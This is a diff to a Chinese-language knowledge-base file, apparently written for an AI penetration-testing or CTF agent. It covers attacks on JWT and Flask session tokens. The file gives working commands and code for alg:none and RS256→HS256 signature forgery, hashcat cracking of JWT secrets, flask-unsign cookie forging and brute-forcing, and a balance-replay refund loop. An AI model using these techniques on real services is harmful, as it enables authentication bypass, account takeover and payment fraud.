@@ -10,7 +10,7 @@
 | 攻击 | 操作 |
 |------|------|
 | alg:none | header 改 `"alg":"none"`，签名段留空 |
-| RS256→HS256 混淆 | 服务端同公钥验两种算法时，用公钥当 HMAC 密钥签名: `jwt_tool.py -pk pubkey -T -S hs256` |
+| RS256→HS256 混淆 | 服务端同公钥验两种算法时，用公钥当 HMAC 密钥签名: python 标准库 hmac 模块（import hmac，自带无需安装）——`sig = hmac.new(open("pubkey.pem","rb").read(), (h+"."+p).encode(), hashlib.sha256).digest()`（h/p 为 base64url 的 header.payload，header alg 改 HS256） |
 | 弱密钥爆破 | `hashcat -m 16500 jwt.txt wordlist.txt` |
 
 ## §2 头部注入面（jwk/jku/kid）
@@ -56,16 +56,16 @@ forged = token.serialize(compact=True)
 
 **JWT 余额重放**: 服务端信 token 内 balance 做退款但不核对购买历史 → 保存初始 JWT → 消费到 0 → 换回旧 token → 退货（货款加到旧余额）→ 循环。检测: token 内嵌余额/次数/等级且消费后 token 内容变化。
 
-**Flask session 伪造**: 区分——token 第二段能 base64 解出 JSON 是 JWT；Flask session 是签名不加密 cookie。伪造: `flask_session_cookie_manager3.py encode -s 'key' -t '{"admin":True}'`；爆破 flask-unsign。
+**Flask session 伪造**: 区分——token 第二段能 base64 解出 JSON 是 JWT；Flask session 是签名不加密 cookie。伪造: `$(dirname $PYTHON_CMD)/flask-unsign --sign --secret 'key' --cookie '{"admin":True}'`; 爆破 `$(dirname $PYTHON_CMD)/flask-unsign --crack --cookie <cookie> --wordlist <dict>`.
 
-**实操**: token 替换后不要在 Burp 重放器刷新——抓包改掉后在网页直接访问（前端读新 token 重渲染）。受保护下载文件可能要修文件头。
+**实操**: token 替换后不要反复重放原请求——改 token 后直接请求受保护资源验证（前端页面会读新 token 重渲染）。受保护下载文件可能要修文件头。
 
 ## §6 工具
 
 | 工具 | 用途 |
 |------|------|
-| jwt_tool | 全能: 算法降级 `-pk pubkey -T -S hs256`、tamper 模式 |
-| flask-unsign | Flask session 解码/爆破/伪造 |
+| python 内联（标准库 hmac + $PYTHON_CMD 环境库 pycryptodome） | 算法降级/tamper 均为几行拼装: header.payload 重编码 + hmac/RSA 签名。注意 pycryptodome 是 import 库（`from Crypto...`）非命令行工具——无 CLI 路径，脚本内 import 使用 |
+| `$(dirname $PYTHON_CMD)/flask-unsign` | Flask session 解码/爆破/伪造（`--decode/--sign/--crack --wordlist`） |
 | hashcat -m 16500 | JWT 弱密钥爆破 |
 | jwcrypto | JWE 构造（Python 库） |
 | hash_extender / hashpumpy | 哈希长度扩展（见 web-crypto-attacks.md §5） |
@@ -73,4 +73,4 @@ forged = token.serialize(compact=True)
 ## §7 关联文件
 
 - `$AGENT_DIR/knowledge-base/auth-attacks.md` — 认证攻击全景（本文件是其 token 侧深化）
-- `$AGENT_DIR/knowledge-base/web-crypto-attacks.md` — 密码学攻击决策表/PadBuster/bit-flip/长度扩展
+- `$AGENT_DIR/knowledge-base/web-crypto-attacks.md` — 密码学攻击决策表/Padding Oracle 内联/bit-flip/长度扩展
